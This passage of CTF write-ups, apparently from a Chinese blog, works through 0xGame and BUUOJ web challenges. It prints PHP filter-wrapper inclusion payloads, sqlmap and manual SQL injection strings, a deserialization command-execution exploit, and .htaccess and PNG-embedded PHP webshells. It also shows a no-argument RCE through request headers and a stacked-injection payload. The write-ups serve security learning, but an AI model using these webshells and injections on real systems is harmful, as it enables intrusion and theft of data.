xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//指定交互方式POST，并发送到api.php</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<span class="hljs-comment">//设置请求头，JSON格式</span><br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-comment">//下面这部分函数用来返回flag</span><br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接伪造一个包好了：<code>POST</code>方法<code>api.php</code>，<code>host</code>就是靶机地址，<code>Content-Type:application/json</code>，注意POST的数据要是JSON格式而且空一行，其它任意:</p><p><img src="/img/youxi2.png" alt="youxi2"></p><p>如果数据包格式有问题它会提示<code>&#123;&quot;message&quot;:&quot;so low score&quot;&#125;</code></p><p>看了官方<code>wp</code>发现还有一种方法：直接打开控制台传<code>gameScore=9999999999</code>，然后等游戏结束：</p><p><img src="/img/youxi3.png" alt="youxi3"></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>包含也有危害？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br><br></code></pre></td></tr></table></figure><p>目测要用伪协议读<code>flag.php</code>的源码，没过滤<code>filter</code>但过滤了<code>base|rot/</code>而且是<code>/i</code>模式，不过没啥影响除了<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>还有很多其它方法。</p><p>之前攻防世界正好做过一个类似的，payload:</p><p><code>?file=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></p><p>源码是这个东西：</p><p><code>&lt;?php //flag&#123;af954c6a-1ac4-4e23-a235-fc4108a03783&#125;</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>虽然使用<code>sqlmap</code>是没有灵魂的，但我还是用了~</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 --current-db<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf --tables<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag --<span class="hljs-built_in">columns</span><br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag -C flag --dump<br></code></pre></td></tr></table></figure><p><code>flag:flag&#123;76715552-3304-4be1-b5e7-235d60421e41&#125;</code></p><p>后面看了下wp，因为太久没做这种手注了也试了试：</p><p>先判断数字型还是字符型注入：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">--+</span>    正常回显，初步猜测字符型注入<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; And <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">--+</span>   正常回显，字符型注入  <span class="hljs-comment">// and 被过滤了，试了试AND结果发现成功绕过</span><br>如果想在URL中用#这个注释符要编码成<span class="hljs-operator">%</span><span class="hljs-number">23</span>,太久没做SQL注入了，一开始把这茬忘了。<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; oRdeR by <span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断几列<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=-</span><span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断回显位，这五个数字同时回显<br>后面就是正常手注过程。<br>一开始以为直接用preg_match的 <span class="hljs-operator">/</span>i模式把大小写都正则匹配掉了，后面发现可以用大小写绕过。本来还想尝试ASCII编码绕过，弄了很久都没成功，找了下发现这种方式在某些版本的mysql中不能用了。。<br>https<span class="hljs-operator">:</span><span class="hljs-comment">//xz.aliyun.com/t/10594#toc-6</span><br></code></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-comment">// private属性，序列化后会在属性前后分别加空(\00,转成URL%00)，构建payload要用rawurlencode</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">__destruct</span>魔术方法，反序列化自动调用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//简单的过滤，想读文件的化可以用c&#x27;&#x27;at，ca$&#123;Z&#125;t等绕过</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//看看当前文件夹下</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//当前文件夹下结果：index.php</span><br></code></pre></td></tr></table></figure><p><img src="/img/unser1.png" alt="unser1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>; <span class="hljs-comment">//看了wp发现直接用head读也行</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;aa2dff68-42ce-46b0-a7d7-bb1d8a524896&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/img/upload2.png" alt="upload2"></p><p>肯定比week1过滤更严格了，上传htaccess.发现上传成功，内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test1.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>再上传<code>test1.png</code>，配置文件的存在可以把<code>test1.png</code>当成<code>php</code>文件，以构造一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;viper&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;notbad&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传路径直接回显就不用<code>F12</code>去找了，可以先访问一下看是否访问成功，然后直接用蚁剑连就能拿<code>flag</code>：</p><p><code>flag&#123;99c580dd-c75e-41f2-89da-4741ab19f655&#125;</code></p><p>后面看wp知道它是检查了文件内容：<code>&lt;?</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>进环境发现是敏感信息泄露，直接用<code>dirsearch</code>扫：</p><p><code>dirsearch -u http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/RCE1.png" alt="RCE1"></p><p><code>.git</code>泄露，切换成根用户<code>python2 GitHack.py http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/.git</code></p><p>发现两个文件，一个<code>index.php</code>一个<code>bo0g1pop.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有个<code>((?R)?\)</code>，典型无参数RCE。</p><p>无参数RCE用的比较多的方法有<code>getallheaders()</code>，<code>get_defined_var()</code>,<code>session_id</code>。这题过滤了<code>get_defined_vars</code>，所以尝试用另外两种。</p><p>先<code>print_r(getallheaders())</code>看看以数组形式返回的包头是什么顺序的，正序还是倒叙？都返回哪些？</p><p><code>/bo0g1pop.php/?star=print_r(getallheaders());</code></p><p><img src="/img/rce22.png" alt="rce22"></p><p>正序回显以上内容，构建<code>payload</code>:</p><p><code>?star=eavl(next(getallheaders()));</code> 并把User-Agent头改成<code>system(&#39;ls&#39;);</code></p><p><img src="/img/rce4.png" alt="rce4"></p><p><img src="/img/rce3.png" alt="rce3"></p><p>后面命令改成<code>cat /flag</code>即可</p><p>虽然Host头第一位就回显了，但不能通过改Host头去执行命令，否则会弹400。或者利用<code>array_reverse</code>改最后回显那个<code>X-Forwarded-Proto</code>头也行</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week2</title>
    <link href="/2023/10/01/%5BWeek%202%5D%20ez_upload/"/>
    <url>/2023/10/01/%5BWeek%202%5D%20ez_upload/</url>
    
    <content type="html"><![CDATA[<p>0xGame第二周，在师傅已经给了大量提示的情况下只做出两个题:(</p><span id="more"></span><hr><h3 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h3><p>根据题目猜测任意文件上传，先打开题目的附件看看有啥东西，发现会对上传的文件利用<code>imagecreatefrom点点点()</code>和<code>image点点点()</code>进行二次渲染，主要部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//获得文件类型，content-type，上传一句话修改文件类型即可绕狗</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//刚刚上传的GIF，给source</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="hljs-comment">//获得文件后缀，当出现多个 . 时，结果为最后一个 . 后面的内容。</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>; <span class="hljs-comment">//将文件原始名md5加密后和user_dir拼接，后面加个.后缀。这东西作为文件的存储路径</span><br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//再次检验文件类型</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<span class="hljs-comment">//将$source保存到$filepath中，</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>: <span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>去网上查了有关二次渲染绕过的资料，发现有些题目是二次渲染配合<code>include</code>函数再上传图片马，但这题没给<code>include</code>函数？根据师傅的提示搜索了生成用于绕过二次渲染的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>放本地运行一下，生成<code>1.png</code>，放到HexCmp下看看：</p><p><img src="/img/ul1.png" alt="ul1"></p><p>有这么个东西：</p><p><code>&lt;?=$_GET[0]($_POST[1]);?&gt;//GET0传函数名，POST1传参数</code></p><p>先后缀改成<code>php</code>，上传时抓包把content-type字段改成<code>image/png</code>，发现上传成功，访问URL：</p><p><img src="/img/ul2.png" alt="ul2"></p><p>成功，<code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls;</code>，先看当前目录下的文件：</p><p><img src="/img/ul3.png" alt="ul3"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls /;</code>，看根目录下的文件：</p><p><img src="/img/ul4.png" alt="ul4"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=cat /flag;</code>，得到<code>flag</code>:</p><p><code>0xGame&#123;4611f622-8577-4ac4-8f85-0b787730800c&#125;</code></p><h3 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h3><p><code>url:http://120.27.148.152:50021/?order=email</code>，师傅提示是堆叠注入，而且直接<code>select flag from flag</code>就能拿答案。</p><p>给了附件，看下源码里黑名单都有啥：</p><p><code>blacklist = [&#39;select&#39;, &#39;update&#39;, &#39;insert&#39;, &#39;delete&#39;, &#39;database&#39;, &#39;table&#39;, &#39;column&#39;, &#39;alter&#39;, &#39;create&#39;, &#39;drop&#39;, &#39;and&#39;, &#39;or&#39;, &#39;xor&#39;, &#39;if&#39;, &#39;else&#39;, &#39;then&#39;, &#39;where&#39;]</code></p><p><code>?order=id;show tables</code>这种没法用了，根据师傅提示可以使用<code>prepare</code>和<code>execute</code>结合执行，有：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>));<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br></code></pre></td></tr></table></figure><p>但select被过滤掉了，空格好像也不能直接用？借助<code>char()</code>函数直接把第一段全转成字符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 